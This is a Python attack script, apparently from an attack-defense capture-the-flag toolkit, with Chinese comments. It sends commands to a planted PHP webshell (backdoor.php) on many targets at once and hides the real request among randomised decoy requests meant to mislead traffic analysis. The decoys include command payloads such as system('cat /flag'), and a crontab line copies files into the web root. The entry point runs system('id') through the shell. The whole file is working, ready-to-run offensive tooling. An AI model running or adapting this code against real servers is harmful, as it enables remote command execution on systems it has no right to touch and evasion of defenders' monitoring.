#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import string
import random
import asyncio

from common import logger, md5, b64e, rsa_decrypt

'''
    混淆流量攻击
    混淆请求 MixRequest - 万假一真 - 还是RSA
    正常请求 NormalRequest - 快速上 Shell & Agent
'''


class NormalRequest:
    """正常流量请求
    """

    USER_AGENTS = [
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
        "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
        "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
        "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"
    ]

    callback = []

    def __init__(self, shell, passwd, targets, rsa=0):
        self.rsa = rsa
        self.shell = shell
        self.passwd = passwd
        self.q_target = asyncio.Queue(maxsize=100)
        [self.q_target.put_nowait(target) for target in targets]

    def __save_log(self, target, data):
        with open("./logs/%s.log" % target, 'a+') as f:
            f.write(data)
            f.flush()

    def _request(self, url, isPost, headers, data, rsa=0):
        try:
            ret = None
            if isPost:
                ret = requests.post(url, headers=headers, data=data, timeout=5)
            else:
                ret = requests.get(url, headers=headers,
                                   params=data, timeout=5)
            if ret.status_code == 200:
                logger.debug("status_code %s" % ret.status_code)
                obj = ret.text if not rsa else rsa_decrypt(ret.text)
                logger.debug(obj)
                if self.callback:
                    logger.debug('callback')
                    if isinstance(self.callback, list):
                        for cb in self.callback:
                            if callable(cb):
                                cb(self.target, obj)
                    elif callable(self.callback):
                        self.callback(self.target, obj)
                else:
                    logger.debug('no callback')
                return ret
            return False
        except Exception as e:
            logger.warn("[!] %s" % e)
            return False

    async def run(self):
        logger.info("[+] Request running...")
        while not self.q_target.empty():
            target = await self.q_target.get()
            try:
                self.attack(target)
                # await asyncio.sleep(0.05)
            except:
                continue

    def start(self, num=10):
        """启动请求 @num 协程数量
        """
        logger.info("[+] Start attack...")
        loop = asyncio.get_event_loop()
        tasks = [self.run() for i in range(num)]
        loop.run_until_complete(asyncio.wait(tasks))
        loop.close()

    def attack(self, target):
        headers = {
            "User-Agent": random.choice(self.USER_AGENTS)
        }
        url = "http://" + target + self.shell
        self.target = target
        self._request(url, True, headers, self.passwd, self.rsa)


class MixRequest(NormalRequest):
    """混淆流量请求
    """

    KEYWORDS = ['preg_replace', 'bcreate_function', 'passthru("cat /flag")', 'shell_exec("cat /flag")',
                'exec("cat /flag")', 'bbase64_decode', 'bedoced_46esab', 'eval', 'system("cat /flag")',
                'proc_open', 'popen', 'curl_exec', 'curl_multi_exec', 'parse_ini_file',
                'show_source', 'file_get_contents("/flag")', 'fsockopen("/flag")', 'cat /flag', 'whoami',
                'exec', 'escapeshellcmd'
                ]

    def __init__(self, shell, passwd, targets, rsa):
        super().__init__(shell, passwd, targets, rsa)
        self.prepare()

    def random_str(self, n=8):
        return ''.join(random.sample(string.ascii_letters + string.digits, n))

    def random_bytes(self, _min=102, _max=1024):
        return bytes(''.join([chr(random.randint(1, 255)) for i in range(random.randint(_min, _max))]), 'utf-8')

    def random_shell_name(self, ext=".php"):
        return "/" + md5(self.random_str()) + ext

    def random_data(self, target="", wwwpath="/var/www/html/"):
        tmpname = self.random_str()
        k = random.randint(1, 8)
        keyworkd = random.choice(self.KEYWORDS)
        if k > 3:
            shell_name = self.random_shell_name()
            keyworkd = "echo '*/1 * * * * /bin/cat /tmp/{} > {}{};/usr/bin/curl \"{}{}\"' | crontab".format(
                tmpname, wwwpath, shell_name, target, shell_name)
        elif k > 6:
            keyworkd = b64e(keyworkd)
        elif k > 9:
            keyworkd = keyworkd
        return keyworkd

    def attack(self, target):
        self.target = target
        for weapon in self.ammunition:
            url = "http://" + target + weapon['name']
            self._request(url, True, weapon['headers'], weapon['data'])

    def prepare(self):
        self.ammunition = []
        _max = random.randint(16, 24)
        _min = random.randint(8, 16)
        t = random.randint(_min, _max)
        rsa=0
        for i in range(_min, _max + 1):
            # 随机正确 shell
            if random.choice([1, 0]):
                shell_name = self.random_shell_name()
            else:
                shell_name = self.shell
                rsa = self.rsa
            if t == i:
                # 攻击流量
                data = self.passwd
                shell_name = self.shell
            elif i % 2 == 0 and i > (_max - 4):
                # 混淆流量
                data = {
                    'p': md5(str(random.randint(1000000, 1000050))),
                    'c': self.random_data()
                }
            else:
                # 混淆流量
                data = b64e(self.random_bytes())
            headers = {
                "User-Agent": random.choice(self.USER_AGENTS)
            }
            self.ammunition.append({
                "data": data,
                "headers": headers,
                "name": shell_name,
                "rsa": rsa
            })

    def test(self):
        self.prepare()
        for weapon in self.ammunition:
            print(weapon)


if __name__ == "__main__":
    # x = MixRequest('backdoor.php', '1', ['127.0.0.1:8085'])
    x = MixRequest('backdoor.php', {"1": "system('id');"}, [
        '127.0.0.1:8085'])
    # x = NormalRequest('backdoor.php', {"1": "system('id');"}, [
    #                   '127.0.0.1:8085'])
    # x.test()
    x.start(1)
